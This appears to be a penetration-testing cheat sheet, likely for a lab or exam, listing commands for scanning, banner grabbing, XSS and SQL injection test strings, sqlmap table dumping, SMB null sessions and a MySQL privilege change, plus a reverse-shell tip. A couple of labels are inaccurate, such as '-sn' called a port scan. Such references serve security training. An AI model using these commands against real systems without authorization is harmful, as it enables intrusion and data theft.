# Cheat Sheet

This cheat sheet is a list of commands to help with the black box
pen test engagements. 

## Networking

Check routing table information

```
$ route
$ ip route
```

Add a network to current route

```
$ ip route add 192.168.10.0/24 via 10.175.3.1
$ route add -net 192.168.10.0 netmask 255.255.255.0 gw 10.175.3.1
```

DNS

```
$ nslookup mysite.com
$ dig mysite.com
```

## Subdomain Enumeration

- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [DNSdumpster](https://dnsdumpster.com/)

## Footprinting & Scanning

Find live hosts with fping or nmap
```
$ fping -a -g 172.16.100.40/24 2>/dev/null | tee alive_hosts.txt
$ nmap -sn 172.16.100.40/24 -oN alive_hosts.txt
```

nmap scan types
```
-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Port Scan
-sV: Service Version information
-O: Operating System information
```

### Spotting a Firewall

If an nmap TCP scan identified a well-known service, such as a web server, but
cannot detect the version, then there may be a firewall in place.

For example:
```
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:
```
80/tcp  open   tcpwrapped 
```

**"tcpwrapped"** means the TCP handshake was completed, but the remote host
closed the connection without receiving any data. 

These are both indicators that a firewall is blocking our scan with the target!

Tips:
- Use "--reason" to see why a port is marked open or closed
- If a "RST" packet is received, then something prevented the connection - probably a firewall!

## Masscan
Masscan is designed to scan thousands of IP addresses at once.


## Vulnerability Assessment

Use the information from the Enumeration/Footprinting phases to find a vulnerable threat vector.

Below are some helpful Vulnerability assessment resources:
- Searchsploit
- ExploitDB
- Msfconsole search command
- Google
- Nessus


## Web Server Fingerprinting

Use netcat for HTTP banner grabbing:
```
$ nc <target addr> 80
HEAD / HTTP/1.0
```

Use OpenSSL for HTTPS banner grabbing:
```
$ openssl s_client -connect target.site:443
HEAD / HTTP/1.0
```

httprint is a web fingerprinting tool that uses **signature-based** technique
to identify web servers. This is more accurate since sysadmins can customize
web server banners.

```
$ httprint -P0 -h <target hosts> -s <signature file>
```

## Directory and File Enumeration

Pick your favorite URI Enumeration tool
- Gobuster - fast, multi-threaded scanner
- Dirbuster - nice GUI
- Dirb - recursively scans directories

## XSS

Look to exploit user input coming from:
- Request headers
- Cookies
- Form inputs
- POST parameters
- GET parameters

Check for XSS
```
<script>alert(1)</script>
<i>some text</i>
```

Steal cookies:
```
<script>alert(document.cookie)</script>
```

## SQL Injection

Same injection points as XSS. 

Boolean Injection:
- and 1=1; -- -
- or 'a'='a'; -- -

Once you determine that a site is vulnerable to SQLi, automate with SQL Map.

```
$ sqlmap -u <url>
$ sqlmap -u <url> -p <parameter>
$ sqlmap -u <url> --tables
$ sqlmap -u <url> -D <database name> -T <table name> --dump
```

## Windows Shares Enumeration

Check what shares are available on a host
```
$ smbclient -L //ip 
$ enum4linux -a ip_address
```

## SMB Null Attack
Try to login without a username or password:

```
$ smbclient //ip/share -N
```

## MySQL Database commands

Login to MySQL with password
```
$ mysql --user=root --port=13306 -p -h 172.16.64.81
```

```
> SHOW databases;
> SHOW tables FROM databases;
> USE database;
> SELECT * FROM table;
```

Change table entry values
```
# Add the user tracking1 to the "adm" group
> update users set adm="yes" where username="tracking1";
```

## Misc

- Found a webshell/admin panel on a site?
	- Run phpinfo(); to determine if it is a PHP shell
- Try to get a reverse shell connection
- Check for flag in the user's home directory
- Enumerate, enumerate, enumerate
